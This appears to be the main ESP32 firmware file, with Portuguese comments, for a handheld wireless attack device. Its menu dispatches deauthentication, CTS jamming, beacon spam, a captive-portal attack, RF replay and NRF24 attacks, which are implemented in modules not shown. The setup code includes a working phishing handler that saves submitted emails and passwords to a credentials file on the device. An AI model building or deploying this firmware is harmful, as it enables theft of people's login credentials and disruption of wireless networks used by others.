#include "esp_err.h"
#include "esp_wifi.h"
#include <Arduino.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFS.h>
#include <TFT_eSPI.h>
#include <WiFi.h>

// Bibliotecas de RF 433 MHz (necessário aqui para o builder do Arduino IDE
// detectar e compilar os .cpp das bibliotecas — só inclui em Menu_RF.cpp
// não é suficiente para o linker)
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <RCSwitch.h>

// Modules
#include "Attacks.h"
#include "Captive.h"
#include "Config.h"
#include "Globals.h"
#include "Menu_Attacks.h"

#include "Battery.h"
#include "HWProbe.h"
#include "Language.h"
#include "Menu_Config.h"
#include "Menu_Main.h"
#include "Menu_NRF24.h"
#include "Menu_Networks.h"
#include "Menu_RF.h"
#include "Radio.h"
#include "Scanner.h"
#include "Splash.h"
#include "UI.h"

// ==================== LIMPEZA ====================

void cleanup() {
  Serial.println("Executando limpeza...");

  if (attackTaskRunning) {
    attackTaskRunning = false;
    delay(300);
  }

  if (attackTaskHandle != NULL) {
    vTaskDelete(attackTaskHandle);
    attackTaskHandle = NULL;
  }

  if (wifiMutex != NULL) {
    vSemaphoreDelete(wifiMutex);
    wifiMutex = NULL;
  }

  radioLocked = false;
  canalTravado = 0;

  deautherAtivo = false;
  beaconAtivo = false;
  ctsAtivo = false;

  Serial.println("Limpeza concluída");
}

// ==================== BATERIA CRÍTICA ====================

static void showLowBatteryShutdown() {
  Serial.println("[BAT] CRITICA! Iniciando desligamento...");

  tft.fillScreen(TFT_BLACK);

  // ── Título Superior ────────────────────────────
  tft.setTextSize(1);
  tft.setTextColor(TFT_RED);
  const char *t1 = lang->sys_bat_critica;
  tft.setCursor((128 - strlen(t1) * 6) / 2, 20);
  tft.print(t1);

  // ── Desenho da Bateria (Centro) ────────────────
  int bx = 30, by = 40, bw = 64, bh = 32;
  // Borda grossa (2 px)
  tft.drawRoundRect(bx, by, bw, bh, 3, TFT_WHITE);
  tft.drawRoundRect(bx - 1, by - 1, bw + 2, bh + 2, 4, TFT_WHITE);
  // Terminal positivo
  tft.fillRoundRect(bx + bw + 2, by + 8, 4, 16, 2, TFT_WHITE);

  // Carga (vermelho) simulando carga baixa
  tft.fillRect(bx + 4, by + 4, 8, bh - 8, TFT_RED);

  // Símbolo de alerta dentro do corpo da bateria
  tft.setTextSize(3);
  tft.setTextColor(TFT_RED);
  tft.setCursor(bx + 26, by + 6);
  tft.print("!");

  // ── Mensagem Inferior ──────────────────────────
  tft.setTextSize(1);
  tft.setTextColor(TFT_LIGHTGREY);
  const char *t2 = lang->sys_bat_conecte;
  tft.setCursor((128 - strlen(t2) * 6) / 2, 84);
  tft.print(t2);

  // ── Percentual ─────────────────────────────────
  char pctBuf[16];
  snprintf(pctBuf, sizeof(pctBuf), lang->sys_bat_pct, batteryPercent());
  tft.setTextColor(TFT_ORANGE);
  tft.setCursor((128 - strlen(pctBuf) * 6) / 2, 102);
  tft.print(pctBuf);

  // ── Contagem Regressiva ────────────────────────
  for (int i = 5; i >= 1; i--) {
    tft.fillRect(0, 130, 128, 16, TFT_BLACK);
    char cbuf[32];
    snprintf(cbuf, sizeof(cbuf), lang->sys_bat_desligando, i);
    tft.setTextColor(TFT_DARKGREY);
    tft.setCursor((128 - strlen(cbuf) * 6) / 2, 134);
    tft.print(cbuf);
    delay(1000);
  }

  // ── Desligamento Físico ────────────────────────
  tft.fillScreen(TFT_BLACK);
  blOff();
  esp_sleep_disable_wakeup_source(ESP_SLEEP_WAKEUP_ALL);
  esp_deep_sleep_start();
}

// ==================== SETUP ====================

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n\n=== INICIANDO SISTEMA ===");

  // Desabilita WDT para as tarefas de Jamming (assim como no original)
  disableCore0WDT();

  // Limpeza forçada do WiFi
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  esp_wifi_stop();
  esp_wifi_deinit();
  delay(500);

  cleanup();
  delay(100);

  wifiMutex = xSemaphoreCreateMutex();
  if (wifiMutex == NULL) {
    Serial.println("ERRO CRÍTICO: Falha ao criar mutex!");
    tft.init();
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_RED);
    tft.setCursor(10, 70);
    tft.println(lang->sys_err_mutex);
    while (1) {
      delay(1000);
    }
  }
  Serial.println("✓ Mutex criado");

  pinMode(BUTTON_LEFT, INPUT_PULLUP);
  pinMode(BUTTON_RIGHT, INPUT_PULLUP);
  pinMode(BUTTON_SELECT, INPUT_PULLUP);
  Serial.println("✓ Botões configurados");

  tft.init();
  tft.setRotation(4);
  tft.fillScreen(TFT_BLACK);
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);
  Serial.println("✓ Display configurado");

  // Inicializa leitura de bateria (ADC + primeiro desenho do ícone)
  batteryInit();

  // ── Verificação de bateria crítica no boot ──────────────────
  if (batteryPercent() <= 5) {
    showLowBatteryShutdown();
  }
  // ────────────────────────────────────────────────────────────

  if (!SPIFFS.begin(true)) {
    Serial.println("ERRO: Falha ao montar SPIFFS");
    tft.setTextColor(TFT_RED);
    tft.setCursor(20, 70);
    tft.println(lang->sys_err_spiffs);
    delay(2000);
  } else {
    Serial.println("✓ SPIFFS montado");
  }

  server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (request->hasParam("email", true) && request->hasParam("senha", true)) {
      String email = request->getParam("email", true)->value();
      String senha = request->getParam("senha", true)->value();

      File file = SPIFFS.open("/credenciais.txt", FILE_APPEND);
      if (file) {
        file.println();
        file.println(" Email: \n  " + email);
        file.println("ㅤ");
        file.println(" Senha: \n  " + senha);
        file.close();
      }
      request->send(200, "text/plain", "Dados recebidos");
    }
  });

  memset(ap_records, 0, sizeof(ap_records));
  memset(&apRecordSelecionado, 0, sizeof(wifi_ap_record_t));

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  Serial.println("✓ WiFi em modo STA");

  // Inicia as preferências salvas e aplica (Brilho, MAC, Modo Menu)
  initConfig();

  systemInitialized = true;

  // Inicializa o CC1101 no boot para aparecer conectado no Menu Config
  // Isso é feito APÓS a tela ter sido configurada para não roubar o barramento
  // SPI
  hwCC1101_ok = rfInit();

  // Inicializa a detecção do NRF24 no boot para aparecer conectado no Menu
  // Config / Sobre
  nrfProbe();

  // Exibe splash screen com a imagem do SPIFFS
  displaySplash(2500); // 2,5 segundos

  // Verifica se é o primeiro boot (nenhum idioma salvo na NVRAM)
  if (!prefs.isKey("idioma")) {
    estadoAtual = TELA_PRIMEIRO_BOOT;
    displayPrimeiroBoot();
  } else {
    estadoAtual = MENU_INICIAL;
    displayMenuInicial();
  }
  
  lastActivityTime = millis();
  Serial.println("=== SISTEMA PRONTO ===\n");
}

static bool isScreensaverAllowed(EstadoTela estado) {
  switch (estado) {
    case MENU_INICIAL:
    case SELECAO_REDES:
    case MENU_ATAQUES:
    case VISUALIZAR_CREDENCIAIS:
    case MENU_CONFIGURACOES:
    case TELA_ARMAZENAMENTO:
    case TELA_SOBRE:
    case TELA_MAC_CHANGER:
    case TELA_BRILHO:
    case TELA_MODO_MENU:
    case MENU_RF:
    case TELA_RF_SAVED:
    case CONFIRMA_APAGAR_CREDENCIAIS:
    case MENU_NRF24:
    case TELA_IDIOMA:
    case TELA_HARDRESET:
    case ATAQUE_BEACON_MODO:
    case ATAQUE_BEACON_CUSTOM:
      return true;
    default:
      return false;
  }
}

// ==================== LOOP ====================

void loop() {
  if (!systemInitialized) {
    delay(100);
    return;
  }

  // Atualiza o timer de atividade se qualquer botão for pressionado
  if (digitalRead(BUTTON_LEFT) == LOW || digitalRead(BUTTON_RIGHT) == LOW || digitalRead(BUTTON_SELECT) == LOW) {
    lastActivityTime = millis();
  }

  // Verifica timeout de inatividade (30 segundos)
  if (isScreensaverAllowed(estadoAtual)) {
    // Screensaver por inatividade global
    if (millis() - lastActivityTime > 30000) {
      if (prefs.getInt("screensaver", 2) != 1) { // 1 = Desativar
        estadoAnteriorScreensaver = estadoAtual;
        startScreensaver(true);
      } else {
        lastActivityTime = millis(); // Reseta para não travar num loop contínuo
      }
      return;
    }
  }

  switch (estadoAtual) {
  case MENU_INICIAL:
    handleMenuInicial();
    break;

  case SELECAO_REDES:
    handleSelecaoRedes();
    break;

  case MENU_ATAQUES:
    handleMenuAtaques();
    break;

  case ATAQUE_INFO_REDE:
    handleInfoRede();
    break;

  case ATAQUE_CAPTIVE_PORTAL:
    handleAtaqueCaptivePortal();
    break;

  case ATAQUE_DEAUTHER:
    handleAtaqueDeauther();
    break;

  case ATAQUE_DEAUTHER_SCAN:
    handleAtaqueDeautherScan();
    break;

  case ATAQUE_CTS_JAMMER:
    handleAtaqueCtsJammer();
    break;

  case ATAQUE_BEACON_MODO:
    handleAtaqueBeaconModo();
    break;

  case ATAQUE_BEACON_CUSTOM:
    handleAtaqueBeaconCustom();
    break;

  case ATAQUE_BEACON:
    handleAtaqueBeacon();
    break;

  case VISUALIZAR_CREDENCIAIS:
    handleVisualizarCredenciais();
    break;

  case MENU_CONFIGURACOES:
    handleConfiguracoes();
    break;

  case TELA_ARMAZENAMENTO:
    handleArmazenamento();
    break;

  case TELA_SOBRE:
    handleSobre();
    break;

  case TELA_MAC_CHANGER:
    handleMudarMAC();
    break;

  case TELA_BRILHO:
    handleBrilho();
    break;

  case TELA_MODO_MENU:
    handleModoMenu();
    break;

  case TELA_SCREENSAVER:
    handleScreensaver();
    break;

  case MENU_RF:
    handleRF();
    break;

  case TELA_RF_REPLAY:
    handleRF_Replay();
    break;

  case TELA_RF_RAW:
    handleRF_Raw();
    break;

  case TELA_RF_ANALYSER:
    handleRF_Analyser();
    break;

  case TELA_RF_RANDOM:
    handleRF_Random();
    break;

  case TELA_RF_SAVED:
    handleRF_Saved();
    break;

  case CONFIRMA_APAGAR_CREDENCIAIS:
    handleConfirmaApagar();
    break;

  case MENU_NRF24:
  case TELA_NRF_ATTACK:
    handleModoNRF24();
    break;

  case TELA_DESLIGAR:
    handleDesligar();
    break;

  case TELA_SCREENSAVER_TEST:
    handleScreensaverTest();
    break;

  case TELA_IDIOMA:
    handleIdioma();
    break;

  case TELA_HARDRESET:
    handleHardReset();
    break;

  case TELA_PRIMEIRO_BOOT:
    handlePrimeiroBoot();
    break;

  case TELA_BEM_VINDO:
    handleBemVindo();
    break;
  }

  // Atualiza ícone de bateria (só redesenha se passou 1 min e mudou >= 5%)
  batteryUpdate();

  // Verificação de bateria crítica durante uso normal
  if (batteryPercent() <= 5) {
    showLowBatteryShutdown();
  }

  delay(10);
}
